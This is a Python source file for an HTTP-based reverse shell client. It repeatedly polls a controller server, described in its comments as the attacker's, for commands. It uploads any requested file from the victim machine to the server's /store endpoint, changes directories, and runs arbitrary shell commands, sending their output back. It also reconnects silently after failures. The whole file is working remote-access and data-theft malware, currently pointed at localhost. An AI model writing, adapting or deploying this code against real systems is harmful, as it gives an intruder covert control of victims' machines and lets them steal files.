
# importing required modules
import subprocess
import time
import requests
import random
import os

# address / CONSTANTS area
HOST = "127.0.0.1"
PORT = 8080
ADDRESS = f"http://{HOST}:{PORT}"

TIME_TO_RECONNECT = random.randint(0, 3)
while True:

    try:
        # sending a GET request to the server <http_server.py>
        req = requests.get(ADDRESS)
        # store the received txt "command" into command variable
        command = req.text 

        # check if the attcker want to terminate the connection
        if 'terminate' in command:
            break

        elif 'get' in command:
            # get files from the clint
            grab, path = command.split(">")
            if os.path.exists(path):
                # redirect to the store file @ serevr side
                url = ADDRESS + "/store"
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files = files)
            else:
                # file doesn't exist
                post_response = requests.post(url = ADDRESS, data = '[-] Not able to find the file!'.encode())

        # file navigation
        elif "cd" in command:
            com, directory = command.split(" ")
            try:
                os.chdir(directory)
                cwd = f"[+] CWD : {os.getcwd()}"
                post_response = requests.post(url = ADDRESS, data = cwd)
            except Exception as error:
                post_response = requests.post(url = ADDRESS, data = str(error))

        else:
            # pass command to cmd/terminal to be executed
            command_result = subprocess.Popen(command,
                                            shell=True,               # execute throght the shell/cmd/terminal.
                                            stdin=subprocess.PIPE,    # for getting input. 
                                            stdout=subprocess.PIPE,   # for getting outputs. 
                                            stderr=subprocess.PIPE)   # for getting errors.

            # POST the command result to the server
            post_response = requests.post(url = ADDRESS, data = command_result.stdout.read())
            # POST the command result "error" to the server
            post_response = requests.post(url = ADDRESS, data = command_result.stderr.read())
    
    except:
        # try to reconnect
        time.sleep(TIME_TO_RECONNECT)
